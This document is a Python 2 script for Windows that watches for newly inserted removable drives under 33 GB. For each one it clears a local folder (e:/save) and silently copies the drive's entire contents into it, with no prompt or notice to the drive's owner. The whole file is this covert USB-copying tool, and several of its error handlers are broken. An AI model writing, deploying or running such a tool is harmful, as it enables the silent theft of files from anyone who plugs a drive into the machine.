# -*- coding: utf-8 -*-
# author:	sirius

import win32file
import os
import os.path
import shutil
import stat
import time


# 得到所有磁盘
def getdrives():
	drives=[]
	# win32file.GetLogicalDrives()
	# 返回值0x111100 表示CDEF盘都有
	# 		0x1111100 表示CDEFG都有
	# 		
	sign=win32file.GetLogicalDrives()


	drive_all=["A:/","B:/","C:/","D:/","E:/","F:/","G:/","H:/","I:/",
				"J:/","K:/","L:/","M:/","N:/","O:/","P:/","Q:/","R:/",
				"S:/","T:/","U:/","V:/","W:/","X:/","Y:/","Z:/"]
	for i in range(25):
		# print '1<<i:',1<<i,sign&1<<i

		if (sign&1<<i):
			# 3代表本地磁盘
			# 2代表可移动盘
			if win32file.GetDriveType(drive_all[i])==2:
				print 'type:',win32file.GetDriveType(drive_all[i])
				drives.append(drive_all[i])
	return {'drives':drives,'sign':sign}

# 判断是不是小型存储
def is_UDisk(drives):
	UDisk=[]
	for item in drives:
		try :
			free_bytes,total_bytes,total_free_bytes=win32file.GetDiskFreeSpaceEx(item)
			print 'free byte:',free_bytes,total_bytes,total_free_bytes,total_bytes/1024/1024/1024

			if (total_bytes/1024/1024/1024)<33:
				UDisk.append(item)
		except :
			break
	return UDisk

# 读入文件夹
def readfolder(rootdir):

	for parent,dirnames,filenames in os.walk(rootdir):    #三个参数：分别返回1.父目录 2.所有文件夹名字（不含路径） 3.所有文件名字
		#输出文件夹信息　　　
		for dirname in  dirnames:
			print "parent is:" + parent
			print  "dirname is:" + dirname
		#输出文件信息
		
		for filename in filenames:
			print "parent is:" + parent
			print "\tfilename is:" + filename
			print "\tthe full name of the file is:" + os.path.join(parent,filename) #输出文件路径信息

# 复制文件夹
def copyfolder(src_dir,save_dir):
	
	# 去掉最后的斜杠
	if (src_dir[-1]=='/' or src_dir[-1]=='\\'):
		src_dir=src_dir[0:-1]

	# 源地址不存在，直接退出
	if False==os.path.exists(src_dir):
		return False
	# 目标地址不存在，创建
	if False==os.path.exists(save_dir):
		os.mkdir(save_dir)

	list_dir=os.listdir(src_dir)
	for x in list_dir:
		way=src_dir+'/'+x
		save_way=save_dir+'/'+x

		print '\tway:',way
		print '\tsave:',save_way

		# 是文件，直接复制
		if os.path.isfile(way):
			shutil.copy(way,save_way)
			# win32file.CopyFile(way,save_way,0)
		else:
			# 是目录
			# 检查目录是否存在
			if False==os.path.exists(save_way):
				try:
					os.mkdir(save_way)
				except Exception, e:
					print str(e)

			try:
				copyfolder(way,save_way)
			except Exception, e:
				print str(e);



# 删除文件夹
def remove_folder(path):
	print path
	# 如果路径不存在
	if os.path.exists(path)==False:
		return False

	if os.path.isdir(path):
		list_dir=os.listdir(path)
		for x in list_dir:
			way=path+'/'+x
			print "delete file :"+way
			
			# 是文件，直接删除
			if os.path.isfile(way):
				mode=os.stat(way).st_mode
				# 只读文件要改一下权限
				if stat.S_IMODE(mode)!=438:
					os.chmod(way,stat.S_IRWXU)
				try:
					os.remove(way)
				except e:
					print str(e)
			else:
				# 是文件夹
				remove_folder(way)
				# 当上一级文件也是空的时候，会把上一级也删除
				if os.path.exists(way):
					os.removedirs(way)
		
	else:
		try:				
			os.remove(path)
		except e:
			print str(e)

if __name__=="__main__":


	last_key=getdrives()['sign']

	while(True):
		new_key=getdrives()['sign']
		if new_key==last_key:
			
			print 'listen...'
			print '\tusb no change...'
			time.sleep(10)
			continue
		else:
			print '\tkey change:',last_key,' to ',new_key
			if new_key>last_key:	
				
				drives=is_UDisk(getdrives()['drives'])

				save_dir='e:/save'

				remove_folder(save_dir)
				print 'remove success'

				for drive in drives:
					# readfolder(drive)
					copyfolder(drive,save_dir)

			last_key=new_key
			time.sleep(5)


